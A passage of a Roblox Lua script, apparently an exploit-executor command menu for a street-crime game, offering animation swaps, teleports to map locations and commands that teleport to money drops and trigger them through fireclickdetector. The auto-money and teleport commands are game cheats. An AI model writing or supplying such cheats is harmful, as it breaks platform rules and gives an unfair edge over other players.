				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Confident.Name = "A_Confident"
			A_Confident.Parent = SpecialTab
			A_Confident.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Confident.BorderSizePixel = 0
			A_Confident.Position = UDim2.new(0, 0, 0.389248967, 0)
			A_Confident.Size = UDim2.new(0, 150, 0, 30)
			A_Confident.Font = Enum.Font.SciFi
			A_Confident.Text = "Confident"
			A_Confident.TextColor3 = Color3.new(1, 1, 1)
			A_Confident.TextSize = 20
			A_Confident.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Popstar.Name = "A_Popstar"
			A_Popstar.Parent = SpecialTab
			A_Popstar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Popstar.BorderSizePixel = 0
			A_Popstar.Position = UDim2.new(0, 0, 0.130671918, 0)
			A_Popstar.Size = UDim2.new(0, 150, 0, 30)
			A_Popstar.Font = Enum.Font.SciFi
			A_Popstar.Text = "Popstar"
			A_Popstar.TextColor3 = Color3.new(1, 1, 1)
			A_Popstar.TextSize = 20
			A_Popstar.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Cowboy.Name = "A_Cowboy"
			A_Cowboy.Parent = SpecialTab
			A_Cowboy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Cowboy.BorderSizePixel = 0
			A_Cowboy.Position = UDim2.new(0, 0, 0.772964239, 0)
			A_Cowboy.Size = UDim2.new(0, 150, 0, 30)
			A_Cowboy.Font = Enum.Font.SciFi
			A_Cowboy.Text = "Cowboy"
			A_Cowboy.TextColor3 = Color3.new(1, 1, 1)
			A_Cowboy.TextSize = 20
			A_Cowboy.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Ghost.Name = "A_Ghost"
			A_Ghost.Parent = SpecialTab
			A_Ghost.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Ghost.BorderSizePixel = 0
			A_Ghost.Position = UDim2.new(0, 0, 0.900632322, 0)
			A_Ghost.Size = UDim2.new(0, 150, 0, 30)
			A_Ghost.Font = Enum.Font.SciFi
			A_Ghost.Text = "Ghost"
			A_Ghost.TextColor3 = Color3.new(1, 1, 1)
			A_Ghost.TextSize = 20
			A_Ghost.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Sneaky.Name = "A_Sneaky"
			A_Sneaky.Parent = SpecialTab
			A_Sneaky.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Sneaky.BorderSizePixel = 0
			A_Sneaky.Position = UDim2.new(0, 0, 0.517628431, 0)
			A_Sneaky.Size = UDim2.new(0, 150, 0, 30)
			A_Sneaky.Font = Enum.Font.SciFi
			A_Sneaky.Text = "Sneaky"
			A_Sneaky.TextColor3 = Color3.new(1, 1, 1)
			A_Sneaky.TextSize = 20
			A_Sneaky.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Princess.Name = "A_Princess"
			A_Princess.Parent = SpecialTab
			A_Princess.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Princess.BorderSizePixel = 0
			A_Princess.Position = UDim2.new(0, 0, 0.645296335, 0)
			A_Princess.Size = UDim2.new(0, 150, 0, 30)
			A_Princess.Font = Enum.Font.SciFi
			A_Princess.Text = "Princess"
			A_Princess.TextColor3 = Color3.new(1, 1, 1)
			A_Princess.TextSize = 20
			A_Princess.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Category_2.Name = "Category"
			Category_2.Parent = SpecialTab
			Category_2.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category_2.BorderSizePixel = 0
			Category_2.Size = UDim2.new(0, 150, 0, 30)
			Category_2.Text = "Special"
			Category_2.TextColor3 = Color3.new(0, 0.835294, 1)
			Category_2.TextSize = 14

			OtherTab.Name = "OtherTab"
			OtherTab.Parent = Main
			OtherTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			OtherTab.BackgroundTransparency = 1
			OtherTab.BorderSizePixel = 0
			OtherTab.Position = UDim2.new(0, 0, 1.06800008, 0)
			OtherTab.Size = UDim2.new(0, 150, 0, 220)

			Category_3.Name = "Category"
			Category_3.Parent = OtherTab
			Category_3.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category_3.BorderSizePixel = 0
			Category_3.Size = UDim2.new(0, 150, 0, 30)
			Category_3.Text = "Other"
			Category_3.TextColor3 = Color3.new(0, 0.835294, 1)
			Category_3.TextSize = 14

			A_None.Name = "A_None"
			A_None.Parent = OtherTab
			A_None.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_None.BorderSizePixel = 0
			A_None.Position = UDim2.new(0, 0, 0.134545445, 0)
			A_None.Size = UDim2.new(0, 150, 0, 30)
			A_None.Font = Enum.Font.SciFi
			A_None.Text = "None"
			A_None.TextColor3 = Color3.new(1, 1, 1)
			A_None.TextSize = 20
			A_None.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=0"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Anthro.Name = "A_Anthro"
			A_Anthro.Parent = OtherTab
			A_Anthro.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Anthro.BorderSizePixel = 0
			A_Anthro.Position = UDim2.new(0, 0, 0.269090891, 0)
			A_Anthro.Size = UDim2.new(0, 150, 0, 30)
			A_Anthro.Font = Enum.Font.SciFi
			A_Anthro.Text = "Anthro (Default)"
			A_Anthro.TextColor3 = Color3.new(1, 1, 1)
			A_Anthro.TextSize = 20
			A_Anthro.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=2510197830"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=2510192778"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=2510195892"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Main:TweenPosition(UDim2.new(0.421999991, 0, 0.28400004, 0))
		end;
	});

	-- I can't be bothered writing these so
	addCommand({
		["Name"] = "bank";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-485.668, 23.631, -285.169)
		end;
	});

	addCommand({
		["Name"] = "hoodfitness";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-75.795, 23.701, -633.72)
		end;
	});

	addCommand({
		["Name"] = "fitness";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-75.795, 23.701, -633.72)
		end;
	});

	addCommand({
		["Name"] = "tyrones1";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-582, 7.172, -739.015)
		end;
	});

	addCommand({
		["Name"] = "gunshop1";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-582, 7.172, -739.015)
		end;
	});

	addCommand({
		["Name"] = "tyrones2";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(475.022, 48.005, -603.737)
		end;
	});

	addCommand({
		["Name"] = "gunshop2";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(475.022, 48.005, -603.737)
		end;
	});

	addCommand({
		["Name"] = "ufo";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71.565, 142.926, -690.33)
		end;
	});

	addCommand({
		["Name"] = "ufohill";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71.565, 142.926, -690.33)
		end;
	});

	addCommand({
		["Name"] = "prison";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-294.162, 22.644, -111.716)
		end;
	});

	addCommand({
		["Name"] = "jail";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-294.162, 22.644, -111.716)
		end;
	});

	addCommand({
		["Name"] = "jailcell";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-294.162, 22.644, -111.716)
		end;
	});

	addCommand({
		["Name"] = "phone";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-120.121, 22.946, -870.425)
		end;
	});

	addCommand({
		["Name"] = "phoneshop";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-120.121, 22.946, -870.425)
		end;
	});

	addCommand({
		["Name"] = "sewers";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(112.622, -26.212, -277.321)
		end;
	});

	addCommand({
		["Name"] = "admin";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
		end;
	});

	addCommand({
		["Name"] = "adminbase";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
		end;
	});

	addCommand({
		["Name"] = "secret";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
		end;
	});

	addCommand({
		["Name"] = "secretbase";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-729.895, -37.642, -885.8)
		end;
	});


	addCommand({
		["Name"] = "playground";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-186.082, 21.829, -763.115)
		end;
	});

	addCommand({
		["Name"] = "boxing";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-236.006, 23.151, -1120.531)
		end;
	});

	addCommand({
		["Name"] = "hoodboxing";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-236.006, 23.151, -1120.531)
		end;
	});

	addCommand({
		["Name"] = "hospital";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.518, 21.755, -481.680)
		end;
	});

	addCommand({
		["Name"] = "tacoshop";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(546.946, 51.061, -493.325)
		end;
	});

	addCommand({
		["Name"] = "church";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(203.938, 21.75, -98.446)
		end;
	});

	addCommand({
		["Name"] = "graveyard";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(198.268, 21.749, 34.383)
		end;
	});

	addCommand({
		["Name"] = "klips";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(5.658, 21.75, -101.094)
		end;
	});

	addCommand({
		["Name"] = "fire";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-132.674, 21.280, -145.176)
		end;
	});


	addCommand({
		["Name"] = "automoney";
		["Function"] = function()
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			for e, f in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
				if f.Name == "MoneyDrop" then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = f.Parent:FindFirstChild("MoneyDrop").CFrame;
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - f.Position).Magnitude <= 50 then
						wait(.8)
						fireclickdetector(f:FindFirstChild("ClickDetector"), 4)
						wait(2)
					end
				end
			end;
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	})

	addCommand({
		["Name"] = "grabmoney";
		["Function"] = function()
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			for e, f in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
				if f.Name == "MoneyDrop" then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = f.Parent:FindFirstChild("MoneyDrop").CFrame;
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - f.Position).Magnitude <= 50 then
						wait(.8)
						fireclickdetector(f:FindFirstChild("ClickDetector"), 4)
						wait(2)
					end
				end
			end;
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	})

	addCommand({
		["Name"] = "gotomoney";
		["Function"] = function()
			local Players = game.Players
			local Player = Players.LocalPlayer

			local toMe = game.Workspace.Ignored.Drop.MoneyDrop

			function telePlr()
				Player.Character.HumanoidRootPart.CFrame = CFrame.new(toMe.Position)
			end
			telePlr()
		end;
	})

	addCommand({
		["Name"] = "autograbmoneyinmagnitude";
		["Function"] = function()
			if (loopVariables.AutoGrabMoneyInMagnitude == false) then
				loopVariables.AutoGrabMoneyInMagnitude = true;
				sendNotif("", "AutoGrabMoneyInMagnitude Enabled.");
			else
				loopVariables.AutoGrabMoneyInMagnitude = false;
				sendNotif("", "AutoGrabMoneyInMagnitude Disabled.");
			end;
			while true do
				wait()
				for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
					if v.Name == "MoneyDrop" and (workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Position).Magnitude < 25 and loopVariables.AutoGrabMoneyInMagnitude == true then
						fireclickdetector(v.ClickDetector)
					end
				end
			end
		end;
	})

	-- Mask Spam
	addCommand({
		["Name"] = "blockspam";
		["Function"] = function()
			gsPlayers = game:GetService("Players")
			gsWorkspace = game:GetService("Workspace")
			gsLighting = game:GetService("Lighting")
			gsReplicatedStorage = game:GetService("ReplicatedStorage")
			gsCoreGui = game:GetService("CoreGui")
			gsTween = game:GetService("TweenService")
			gsHttp = game:GetService("HttpService")

			LP = gsPlayers.LocalPlayer
			Mouse = LP:GetMouse()

			LP.Character.ChildAdded:Connect(function(b)
				wait(0)
				if b:IsA("Accessory") then
					b.Handle.Mesh:Destroy()
					b.Parent = gsWorkspace
				end
			end)
		end;
	});

	-- Drops all accessories [Hats, hair etc]
	addCommand({
		["Name"] = "drophats";
		["Function"] = function()
			for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
				if v:IsA("Accessory") then
					v.Parent = workspace
				end
			end
		end;
	});

	addCommand({
		["Name"] = "drop";
		["Function"] = function()
			for _, v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
				if v:IsA("Accessory") then
					v.Parent = workspace
				end
			end
		end;
	});

	-- Saves Position
	addCommand({
		["Name"] = "savepos";
		["Function"] = function()
			sendNotif("", "Saved Positon", 15);
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end;
	});

	addCommand({
		["Name"] = "saveposition";
		["Function"] = function()
			sendNotif("", "Saved Positon", 15);
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		end;
	});

	-- Loads Position
	addCommand({
		["Name"] = "loadpos";
		["Function"] = function()
			sendNotif("", "Loaded Position", 15);
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "loadposision";
		["Function"] = function()
			sendNotif("", "Loaded Position", 15);
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	-- Astronaut Animation
	addCommand({
		["Name"] = "astronaut";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});


	-- Bubbly Animation
	addCommand({
		["Name"] = "bubbly";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
			Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
			Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Cartoony Animation
	addCommand({
		["Name"] = "cartoony";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Elder Animation
	addCommand({
		["Name"] = "elder";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Knight Animation
	addCommand({
		["Name"] = "knight";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Levitation Animation
	addCommand({
		["Name"] = "levitation";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Mage Animation
	addCommand({
		["Name"] = "mage";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Ninja Animation
	addCommand({
		["Name"] = "ninja";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
			Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
			Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
			game.Players.LocalPlayer.Character.Humanoid.Jump = true
		end;
	});

	-- Pirate Animation
	addCommand({
		["Name"] = "pirate";
		["Function"] = function()
			local Animate = game.Players.LocalPlayer.Character.Animate
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
